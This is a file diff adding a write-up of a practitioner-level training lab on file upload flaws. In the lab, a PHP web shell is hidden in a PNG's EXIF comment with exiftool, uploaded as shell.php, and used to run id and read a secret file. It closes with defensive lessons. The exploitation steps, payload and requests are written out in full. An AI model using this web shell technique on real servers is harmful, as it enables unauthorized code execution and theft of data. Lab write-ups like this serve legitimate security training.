@@ -1,0 +1,66 @@
+================================
+LAB: Remote Code Execution via Polyglot Web Shell Upload
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-23
+Lab URL: https://0a0000b6040a54938355237800da0066.web-security-academy.net
+Category: File Upload Vulnerabilities
+Level: Practitioner
+Objective: Upload a PHP web shell disguised as a valid image to execute server-side code and read /home/carlos/secret.
+Description: The upload function validates file content to verify it is a genuine image, but fails to prevent execution of server-side code embedded in image metadata.
+
+[RECONNAISSANCE]
+----------------
+- Logged in as wiener:peter, identified avatar upload at POST /my-account/avatar
+- Upload accepts multipart/form-data with fields: avatar (file), user, csrf
+- Server stores files at /files/avatars/<filename> — directly accessible via GET
+- Uploaded a legitimate PNG (dreamhouse-logo.png) — server responded:
+  "The file avatars/dreamhouse-logo.png has been uploaded."
+- Confirmed files are served by Apache/2.4.41 (Ubuntu)
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- Server performs content-based image validation (checks magic bytes/structure), not just extension or Content-Type
+- However, it does NOT strip EXIF metadata before saving the file
+- Apache executes .php files in /files/avatars/ — no PHP execution restriction on that directory
+- Conclusion: injecting PHP payload into EXIF Comment field of a valid PNG, uploaded with .php extension, bypasses content check and achieves RCE
+
+[EXPLOITATION]
+--------------
+1. Copied a valid PNG from the system:
+   cp /usr/share/pixmaps/debian-logo.png ~/shell.png
+
+2. Injected PHP web shell into EXIF Comment field using exiftool:
+   exiftool -Comment='<?php system($_GET["cmd"]); ?>' ~/shell.png -o shell.php
+
+3. Verified polyglot integrity:
+   file shell.php → "PNG image data, 48x48, 8-bit/color RGBA, non-interlaced"
+
+4. Uploaded shell.php via the avatar upload form (filename: shell.php, Content-Type: text/php)
+   Server response: "The file avatars/shell.php has been uploaded."
+
+5. Triggered RCE — confirmed execution:
+   GET /files/avatars/shell.php?cmd=id
+   Response (in tEXtComment chunk): uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
+
+6. Read the secret:
+   GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret
+   Response (in tEXtComment chunk): 2dxfdSTApe96sB2qGKnJ7GPt1NhNNC3W
+
+7. Submitted the secret via the lab banner — lab solved.
+
+[EVIDENCE]
+----------
+- RCE confirmed via cmd=id: uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
+- Secret exfiltrated: 2dxfdSTApe96sB2qGKnJ7GPt1NhNNC3W
+- Output embedded in PNG tEXtComment chunk of server response
+
+[LESSONS LEARNED]
+-----------------
+- Content-based image validation alone is insufficient — EXIF/metadata must also be sanitized on upload
+- File extension controls PHP execution; storing uploaded files in a web-accessible directory with no execution policy is dangerous
+- Polyglot files can satisfy two format validators simultaneously — a file can be both a valid PNG and valid PHP
+- Output of system() landed in EXIF Comment because PHP executed inside binary PNG context; use delimiter markers (e.g. "|||") to isolate output in noisy responses
+- Defense: strip all metadata on upload (e.g. re-encode image), store files outside webroot or in a non-executable directory, enforce Content-Type restrictions server-side
